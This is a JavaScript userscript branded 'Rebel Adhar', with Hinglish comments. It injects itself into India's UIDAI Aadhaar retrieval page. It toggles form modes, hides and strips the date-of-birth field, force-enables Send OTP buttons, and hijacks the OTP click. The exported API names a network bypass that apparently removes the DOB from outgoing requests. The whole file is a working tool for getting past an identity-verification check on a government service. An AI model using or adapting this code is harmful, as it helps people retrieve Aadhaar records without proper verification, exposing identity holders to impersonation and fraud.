  /** UIDAI live: sirf "Enter Email Address" (bina OR) bhi hota hai */
  function isToggleText(text, el) {
    const t = norm(text);
    if (isOrLinkText(t)) return true;
    if (t.length < 5 || t.length > 45) return false;
    if (isFormLabel(el)) return false;
    if (/date of birth|enter captcha|enter name|जन्म|as per aadhaar/i.test(t)) return false;
    if (/^enter\s*(e-?mail|email)(\s*(address|id))?$/i.test(t)) return true;
    if (/^enter\s*(mobile|phone)(\s*(number|no))?$/i.test(t) && isLinkish(el)) return true;
    if (/या\s*(ईमेल|मोबाइल)/i.test(t) || /(email|mobile)\s*instead/i.test(t)) return true;
    return false;
  }

  function kindFromOrText(text) {
    const t = norm(text);
    if (/e-?mail|email|ईमेल/i.test(t)) return 'email';
    if (/mobile|phone|मोबाइल/i.test(t)) return 'mobile';
    return 'other';
  }

  function xpathOrLinks(uiSel) {
    const out = [];
    const seen = new Set();
    try {
      const snap = document.evaluate(
        "//*[self::a or self::button or self::span or self::div][contains(translate(normalize-space(.), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'or enter') or contains(translate(normalize-space(.), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'enter email') or contains(translate(normalize-space(.), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'enter mobile')]",
        document,
        null,
        XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,
        null
      );
      for (let i = 0; i < snap.snapshotLength; i++) {
        const el = snap.snapshotItem(i);
        const text = norm(el.innerText || el.textContent || '');
        if (!isToggleText(text, el)) continue;
        const click = leafClickable(el);
        if (!click || seen.has(click) || !isInDom(click, uiSel)) continue;
        seen.add(click);
        out.push({ el: click, text, kind: kindFromOrText(text) });
      }
    } catch (_e) {}
    return out;
  }

  function discoverOrLinks(uiSel) {
    const found = [];
    const seen = new Set();
    const seenText = new Set();

    function add(el, raw) {
      if (!el || seen.has(el)) return;
      const text = norm(raw || el.innerText || el.textContent || '');
      if (!isToggleText(text, el)) return;
      const click = leafClickable(el);
      if (!click || seen.has(click)) return;
      if (!isInDom(click, uiSel)) return;
      const kind = kindFromOrText(text);
      const dedupeKey = kind + ':' + text;
      if (seenText.has(dedupeKey)) return;
      seenText.add(dedupeKey);
      seen.add(click);
      found.push({ el: click, text, kind });
    }

    const sel =
      'a, button, span, div, p, mat-hint, [matSuffix], [matsuffix], [role="button"], [role="link"], .uidai-or-link, .or-link, [class*="or-link"], [class*="or_link"], [class*="link"], [class*="toggle"], [class*="suffix"]';
    qAll(sel).forEach((el) => add(el));

    findDobBlocks().forEach((block) => {
      block.querySelectorAll(sel).forEach((el) => add(el));
    });

    qAll('mat-form-field, .mat-mdc-form-field').forEach((mff) => {
      mff.querySelectorAll(sel).forEach((el) => add(el));
    });

    qAll('*').forEach((el) => {
      if ((el.children?.length || 0) > 5) return;
      add(el);
    });

    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
    let node;
    while ((node = walker.nextNode())) {
      const t = norm(node.textContent || '');
      if (!t || t.length > 50) continue;
      if (!/\bor\b|enter\s*(e-?mail|email|mobile)/i.test(t)) continue;
      let cur = node.parentElement;
      for (let i = 0; i < 5 && cur; i++, cur = cur.parentElement) {
        add(cur, cur.innerText || cur.textContent);
      }
    }

    xpathOrLinks(uiSel).forEach((hit) => {
      if (!seen.has(hit.el)) {
        seen.add(hit.el);
        found.push(hit);
      }
    });

    const order = { email: 0, mobile: 1, other: 2 };
    found.sort((a, b) => {
      const d = (order[a.kind] ?? 9) - (order[b.kind] ?? 9);
      if (d) return d;
      return a.text.length - b.text.length;
    });
    return found;
  }

  function findOrEmailLink(uiSel) {
    return discoverOrLinks(uiSel).find((l) => l.kind === 'email')?.el || null;
  }

  function findOrMobileLink(uiSel) {
    return discoverOrLinks(uiSel).find((l) => l.kind === 'mobile')?.el || null;
  }

  function simulateClick(el) {
    if (!el) return;
    try {
      el.scrollIntoView?.({ block: 'center', inline: 'nearest', behavior: 'instant' });
    } catch (_e) {}
    el.focus?.();
    const o = { bubbles: true, cancelable: true, view: window };
    ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click'].forEach((type) => {
      el.dispatchEvent(new MouseEvent(type, o));
    });
    el.click?.();
  }

  function waitMs(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  async function clickToggle(link, log) {
    if (!link?.el) return;
    log?.('info', 'UIDAI mode click', link.text);
    simulateClick(link.el);
    await waitMs(1500);
  }

  async function tryUidaiModeSwitch(uiSel, log) {
    if (isDobBypassed(uiSel)) return true;

    const links = discoverOrLinks(uiSel);
    log?.('info', 'OR links scan', links.map((l) => l.text));

    if (!links.length) {
      const sample = norm(document.body?.innerText || '').slice(0, 320);
      log?.('warn', 'OR toggle not found', { sample });
      return false;
    }

    const email = links.find((l) => l.kind === 'email');
    const mobile = links.find((l) => l.kind === 'mobile');

    if (email) {
      await clickToggle(email, log);
      if (isDobBypassed(uiSel)) return true;
      await waitMs(800);
    }

    const mobileAfter = discoverOrLinks(uiSel).find((l) => l.kind === 'mobile') || mobile;
    if (mobileAfter) {
      await clickToggle(mobileAfter, log);
      if (isDobBypassed(uiSel)) return true;
    }

    const mobileLabel = discoverOrLinks(uiSel).find(
      (l) => l.kind === 'mobile' || /enter\s*mobile/i.test(l.text)
    );
    if (mobileLabel && mobileLabel !== mobileAfter) {
      await clickToggle(mobileLabel, log);
      if (isDobBypassed(uiSel)) return true;
    }

    if (!email && mobile) {
      await clickToggle(mobile, log);
      if (isDobBypassed(uiSel)) return true;
    }

    for (const link of links) {
      if (isDobBypassed(uiSel)) return true;
      await clickToggle(link, log);
    }

    return links.length > 0;
  }

  function runModeSwitchRetry(uiSel, log, times) {
    let chain = Promise.resolve();
    for (let i = 0; i < (times || 6); i++) {
      chain = chain.then(() => tryUidaiModeSwitch(uiSel, log)).then(() => {
        if (isDobBypassed(uiSel)) return false;
        return waitMs(900);
      });
    }
    return chain;
  }

  function startBypassPoller(uiSel, log, on) {
    if (bypassPoller) clearInterval(bypassPoller);
    if (!on) return;
    let n = 0;
    bypassPoller = setInterval(() => {
      n += 1;
      if (n > 24 || isDobBypassed(uiSel)) {
        clearInterval(bypassPoller);
        bypassPoller = null;
        return;
      }
      if (isDobBypassed(uiSel)) return;
      tryUidaiModeSwitch(uiSel, log).then(() => {
        if (!isDobBypassed(uiSel)) advancedBypass(uiSel, log);
      });
    }, 2500);
  }

  function startWatcher(uiSel, log, on) {
    if (dobWatcher) dobWatcher.disconnect();
    if (watchTimer) clearTimeout(watchTimer);
    if (!on) return;
    dobWatcher = new MutationObserver(() => {
      if (watchTimer) return;
      watchTimer = setTimeout(() => {
        watchTimer = null;
        if (isDobBypassed(uiSel)) return;
        advancedBypass(uiSel, log);
      }, 500);
    });
    dobWatcher.observe(document.documentElement, { childList: true, subtree: true, attributes: true });
  }

  function apply(uiSel, log) {
    startWatcher(uiSel, log, true);
    startBypassPoller(uiSel, log, true);
    return runModeSwitchRetry(uiSel, log, 6).then(() => {
      return new Promise((resolve) => {
        setTimeout(() => {
          const adv = advancedBypass(uiSel, log);
          if (!adv.dobBypassed) {
            log?.('warn', 'DOB abhi dikhe — Bypass DOB dubara dabao', adv);
          } else {
            log?.('info', 'DOB bypass OK — form ready (bina DOB)', { dobVisible: adv.dobVisible });
          }
          const diag = getFormDiagnostics(uiSel);
          const state = {
            dobBypassed: isDobBypassed(uiSel),
            dobInForm: getDobInputs().length,
            dobVisible: dobFieldVisible(uiSel),
            formOk: isFormReadyForOtp(uiSel),
            diag,
          };
          log?.('info', 'Rebel Adhar ready', state);
          resolve(state);
        }, 1600);
      });
    });
  }

  function enableOtpButtons() {
    qAll('button, [role="button"], input[type="submit"]').forEach((btn) => {
      const t = norm(btn.textContent || btn.value || '');
      if (!t.includes('send otp') && !t.includes('request otp')) return;
      btn.disabled = false;
      btn.removeAttribute('disabled');
      btn.classList.remove('mat-button-disabled', 'mat-mdc-button-disabled', 'disabled');
      btn.style.pointerEvents = 'auto';
    });
  }

  function buildSubmitState(uiSel, log) {
    const after = getFormDiagnostics(uiSel);
    const bypassed = isDobBypassed(uiSel);
    const state = {
      dobBypassed: bypassed,
      dobInForm: getDobInputs().length,
      after,
      formOk: isFormReadyForOtp(uiSel),
    };
    log?.('info', 'Send OTP prep', state);
    if (!bypassed) {
      log?.('error', 'DOB bypass fail — Bypass DOB dabao (DOB mat bharo)', {
        dobInForm: state.dobInForm,
        dobVisible: after.dobVisible,
        orLinks: after.orLinks,
      });
    } else if (!state.formOk) {
      const miss = (after.fields || []).filter(
        (f) => (f.type === 'name' || f.type === 'mobile' || f.type === 'captcha') && !f.ok
      );
      log?.('error', 'Fill missing', miss.length ? miss : after.fields);
    }
    return state;
  }

  /** OTP prep — mode switch + DOB neutralize; fake date KABHI NAHI */
  function prepareSubmit(uiSel, log) {
    advancedBypass(uiSel, log);
    return buildSubmitState(uiSel, log);
  }

  /** Mode switch + fallback neutralize */
  async function ensureDobBypassed(uiSel, log, tries) {
    if (isDobBypassed(uiSel)) return true;
    const n = tries || 10;
    for (let i = 0; i < n; i++) {
      await tryUidaiModeSwitch(uiSel, log);
      if (isDobBypassed(uiSel)) return true;
      await waitMs(700);
    }
    advancedBypass(uiSel, log);
    return isDobBypassed(uiSel);
  }

  async function prepareSubmitAsync(uiSel, log) {
    await ensureDobBypassed(uiSel, log, 10);
    advancedBypass(uiSel, log);
    return buildSubmitState(uiSel, log);
  }

  function formReady() {
    return qAll('input:not([type="hidden"])').length >= 3;
  }

  function waitForForm(timeout) {
    return new Promise((resolve) => {
      if (formReady()) return resolve(true);
      const deadline = Date.now() + (timeout || 25000);
      const obs = new MutationObserver(() => {
        if (formReady()) {
          obs.disconnect();
          resolve(true);
        }
      });
      obs.observe(document.documentElement, { childList: true, subtree: true });
      const tick = setInterval(() => {
        if (formReady()) {
          clearInterval(tick);
          obs.disconnect();
          resolve(true);
        } else if (Date.now() > deadline) {
          clearInterval(tick);
          obs.disconnect();
          resolve(false);
        }
      }, 400);
    });
  }

  function stopWatcher() {
    if (dobWatcher) dobWatcher.disconnect();
    dobWatcher = null;
    if (bypassPoller) clearInterval(bypassPoller);
    bypassPoller = null;
  }

  function dobFieldVisible(uiSel) {
    return getDobInputs().some((i) => isVisible(i, uiSel) && !i.closest('[data-rebel-dob-hidden]'));
  }

  return {
    norm,
    SILENT_DOB,
    SILENT_DOB_ISO,
    DISABLED_MARK,
    HIDDEN_MARK,
    hideDob,
    disableDob,
    patchAngularForms,
    getFormDiagnostics,
    isFormReadyForOtp,
    isDobBypassed,
    quickModeSwitch,
    discoverOrLinks,
    getFieldSnapshot,
    ensureMobileModeSync,
    neutralizeEmail,
    readInputVal,
    isDobHidden,
    isDobDisabled,
    dobFieldVisible,
    apply,
    prepareSubmit,
    prepareSubmitAsync,
    ensureDobBypassed,
    formReady,
    waitForForm,
    getMatFields,
    classifyField,
    stopWatcher,
    neutralizeDobControls,
    clearDobValuesOnly,
    advancedBypass,
    forceSubmitOtp,
    installNetworkBypass,
    stripDobDeep,
    stripDobFromBody,
  };
});


(function () {
  'use strict';
  const E = UidaiRetrieveEngine;
  const KEY = 'rebelAdharOn';

  window.__rebelNetHooks = {
    log: function (level, msg, data) {
      console.log('[Rebel Adhar]', level, msg, data ?? '');
    },
    enabled: function () { return localStorage.getItem(KEY) === '1'; },
    onHit: function () {},
  };
  if (E.installNetworkBypass) E.installNetworkBypass(window.__rebelNetHooks);
  const LOG_ID = 'rebel-adhar-log-panel';
  const LOG_BODY = 'rebel-adhar-log-body';
  const UI_SEL = '#' + LOG_ID + ',#rebel-fab,#rebel-switch-btn,#rebel-logs-btn,#rebel-debug-btn,#rebel-status-strip';

  let on = localStorage.getItem(KEY) === '1';
  const logs = [];
  let netCount = 0;

  function log(level, msg, data) {
    logs.push({ t: new Date().toLocaleTimeString(), level, msg, data });
    if (logs.length > 100) logs.shift();
    renderLogs();
    console.log('[Rebel Adhar]', level, msg, data ?? '');
  }

  function renderLogs() {
    ensureUI();
    const b = document.getElementById(LOG_BODY);
    if (!b) return;
    b.textContent = logs.map((l) => {
      const x = l.data !== undefined ? ' | ' + (typeof l.data === 'string' ? l.data : JSON.stringify(l.data)) : '';
      return '[' + l.t + '] ' + l.level.toUpperCase() + ' ' + l.msg + x;
    }).join('\n');
    b.scrollTop = b.scrollHeight;
  }

  function ensureUI() {
    if (!document.getElementById('rebel-adhar-style')) {
      const st = document.createElement('style');
      st.id = 'rebel-adhar-style';
      st.textContent =
        '#rebel-adhar-log-panel{position:fixed;left:6px;right:6px;bottom:6px;max-height:36vh;z-index:2147483646;background:rgba(8,12,20,.97);color:#bbf7d0;border:1px solid #334155;border-radius:10px;font:10px/1.45 monospace}' +
        '#rebel-adhar-log-header{display:flex;justify-content:space-between;padding:6px 8px;background:#111827;color:#fff;font:700 11px system-ui}' +
        '#rebel-adhar-log-header button{border:none;border-radius:5px;padding:3px 7px;margin-left:4px;background:#374151;color:#fff}' +
        '#rebel-adhar-log-body{margin:0;padding:8px;max-height:calc(36vh - 32px);overflow:auto;white-space:pre-wrap}' +
        '#rebel-fab{position:fixed;right:10px;bottom:78px;z-index:2147483647;border:none;border-radius:999px;padding:12px 14px;color:#fff;font:700 12px system-ui;box-shadow:0 6px 18px rgba(0,0,0,.35)}' +
        '#rebel-switch-btn{position:fixed;right:10px;bottom:136px;z-index:2147483647;border:none;border-radius:999px;padding:10px 12px;background:#0052a5;color:#fff;font:700 11px system-ui}' +
        '#rebel-logs-btn{position:fixed;right:10px;bottom:194px;z-index:2147483647;border:none;border-radius:999px;padding:10px 12px;background:#4b5563;color:#fff;font:700 11px system-ui}' +
        '#rebel-status-strip{position:fixed;top:0;left:0;right:0;z-index:2147483645;padding:6px 10px;text-align:center;font:700 12px system-ui;color:#fff;display:none}';
      document.documentElement.appendChild(st);
    }
    if (!document.getElementById(LOG_ID)) {
      const p = document.createElement('div');
      p.id = LOG_ID;
      p.innerHTML = '<div id="rebel-adhar-log-header"><strong>Rebel Adhar Logs</strong><span><button type="button" id="rebel-clr">Clear</button><button type="button" id="rebel-hid">Hide</button></span></div><pre id="' + LOG_BODY + '"></pre>';
      document.documentElement.appendChild(p);
      document.getElementById('rebel-clr').onclick = function () { logs.length = 0; renderLogs(); };
      document.getElementById('rebel-hid').onclick = function () {
        document.getElementById(LOG_BODY).style.display = document.getElementById(LOG_BODY).style.display === 'none' ? 'block' : 'none';
      };
    }
    if (!document.getElementById('rebel-status-strip')) {
      const s = document.createElement('div');
      s.id = 'rebel-status-strip';
      document.documentElement.appendChild(s);
    }
    if (!document.getElementById('rebel-fab')) {
      const fab = document.createElement('button');
      fab.id = 'rebel-fab';
      fab.onclick = function () {
        on = !on;
        localStorage.setItem(KEY, on ? '1' : '0');
        if (on) runOn(); else log('info', 'OFF — page reload karo');
        updateBtns();
      };
      document.documentElement.appendChild(fab);
    }
    if (!document.getElementById('rebel-switch-btn')) {
      const b = document.createElement('button');
      b.id = 'rebel-switch-btn';
      b.textContent = 'Bypass DOB';
      b.onclick = function () {
        if (!on) return;
        log('info', 'Bypass DOB — mode switch retry');
        if (E.apply) E.apply(UI_SEL, log);
      };
      document.documentElement.appendChild(b);
    }
    if (!document.getElementById('rebel-logs-btn')) {
      const b = document.createElement('button');
      b.id = 'rebel-logs-btn';
      b.textContent = 'Logs';
      b.onclick = function () {
        document.getElementById(LOG_ID).style.display = document.getElementById(LOG_ID).style.display === 'none' ? 'block' : 'none';
      };
      document.documentElement.appendChild(b);
    }
    if (!document.getElementById('rebel-debug-btn')) {
      const b = document.createElement('button');
      b.id = 'rebel-debug-btn';
      b.textContent = 'Copy Debug';
      b.style.cssText = 'position:fixed;right:10px;bottom:252px;z-index:2147483647;border:none;border-radius:999px;padding:10px 12px;background:#7c3aed;color:#fff;font:700 11px system-ui';
      b.onclick = function () {
        const d = E.getFormDiagnostics ? E.getFormDiagnostics(UI_SEL) : {};
        const orLinks = E.discoverOrLinks ? E.discoverOrLinks(UI_SEL).map(function (l) { return l.text; }) : [];
        const txt = JSON.stringify({ url: location.href, on: on, diag: d, orLinks: orLinks, logs: logs.slice(-15) }, null, 2);
        try { navigator.clipboard.writeText(txt); log('info', 'Debug copied'); } catch (_e) { log('info', 'Debug', txt); }
      };
      document.documentElement.appendChild(b);
    }
    updateBtns();
  }

  function updateStatus() {
    const strip = document.getElementById('rebel-status-strip');
    if (!strip) return;
    if (!on) { strip.style.display = 'none'; return; }
    const bypassed = E.isDobBypassed ? E.isDobBypassed(UI_SEL) : false;
    strip.style.display = 'block';
    if (bypassed) {
      strip.textContent = 'Rebel Adhar — DOB bypass OK | Name + Mobile + Captcha bharo → Send OTP';
      strip.style.background = '#0a7a2f';
    } else {
      strip.textContent = 'Rebel Adhar — DOB abhi dikhe | Bypass DOB dabao';
      strip.style.background = '#b45309';
    }
    const fab = document.getElementById('rebel-fab');
    if (fab && on) fab.textContent = bypassed ? 'Rebel ON ✓' : 'Rebel ON ✗';
  }

  function updateBtns() {
    const fab = document.getElementById('rebel-fab');
    if (fab) {
      if (!on) fab.textContent = 'Rebel Adhar OFF';
      fab.style.background = on ? '#0a7a2f' : '#b42318';
    }
    updateStatus();
  }

  var otpNetWatch = false;

  function isOtpUrl(u) {
    return /otp|uidai|aadhaar|retrieve|send|verify|auth|generate|myaadhaar|gov.in/i.test(u || '');
  }

  function shouldLogNet(u, method) {
    if (!on) return false;
    if (otpNetWatch) return true;
    return isOtpUrl(u) || (method && String(method).toUpperCase() === 'POST');
  }

  function installNet() {
    if (window.__rebelNet8) return;
    window.__rebelNet8 = true;
    if (window.__rebelNetHooks) {
      window.__rebelNetHooks.log = log;
      window.__rebelNetHooks.enabled = function () { return on; };
      window.__rebelNetHooks.onHit = function (kind, method, url) {
        if (!shouldLogNet(url, method)) return;
        netCount += 1;
        log('req', kind + ' ' + method, String(url || '').slice(0, 120));
      };
    }
  }

  var skipOtpHook = false;

  function watchOtp() {
    if (window.__rebelOtp83) return;
    window.__rebelOtp83 = true;
    document.addEventListener('click', function (e) {
      if (!on || skipOtpHook) return;
      const btn = e.target?.closest?.('button,[role="button"],a,input[type="submit"]');
      if (!btn) return;
      const t = E.norm(btn.textContent || btn.value || '');
      if (!t.includes('send otp') && !t.includes('request otp')) return;

      const before = netCount;
      otpNetWatch = true;
      setTimeout(function () { otpNetWatch = false; }, 8000);

      e.preventDefault();
      e.stopImmediatePropagation();

      const runPrep = E.prepareSubmitAsync ? E.prepareSubmitAsync(UI_SEL, log) : Promise.resolve(E.prepareSubmit(UI_SEL, log));
      runPrep.then(function (prep) {
        if (!prep.dobBypassed) {
          log('error', 'DOB bypass nahi hua — Bypass DOB dabao. DOB mat bharo.', {
            dobInForm: prep.dobInForm,
            dobVisible: prep.after?.dobVisible,
          });
          return;
        }
        if (!prep.formOk) {
          log('error', 'Pehle naam + mobile + captcha bharo', prep.after);
          return;
        }
        log('info', 'OTP send', { dobBypassed: true, dobVisible: false });
        skipOtpHook = true;
        if (E.forceSubmitOtp) E.forceSubmitOtp(btn, log);
        else btn.click();
        setTimeout(function () { skipOtpHook = false; }, 600);
        setTimeout(function () {
          if (netCount <= before) {
            log('error', 'NO API CALL — Bypass DOB dubara try karo');
            if (E.getFormDiagnostics) log('info', 'Debug', E.getFormDiagnostics(UI_SEL));
          }
        }, 6000);
      });
    }, true);
  }

  async function runOn() {
    ensureUI();
    installNet();
    watchOtp();
    log('info', 'Rebel Adhar ON — DOB bypass shuru');
    const ready = await E.waitForForm(30000);
    if (!ready) { log('warn', 'Form timeout — page reload karo'); return; }
    await E.apply(UI_SEL, log);
    updateStatus();
    const bypassed = E.isDobBypassed ? E.isDobBypassed(UI_SEL) : false;
    log('info', bypassed ? 'Advanced bypass OK — naam+mobile+captcha → Send OTP' : 'Bypass DOB dabao', {
      dobVisible: E.dobFieldVisible(UI_SEL),
      orLinks: E.discoverOrLinks ? E.discoverOrLinks(UI_SEL).map(function (l) { return l.text; }) : [],
    });
    setInterval(function () { if (on) updateStatus(); }, 3000);
  }

  ensureUI();
  installNet();
  watchOtp();
  if (on) runOn();
  else log('info', 'Rebel Adhar OFF — ON dabao');
})();
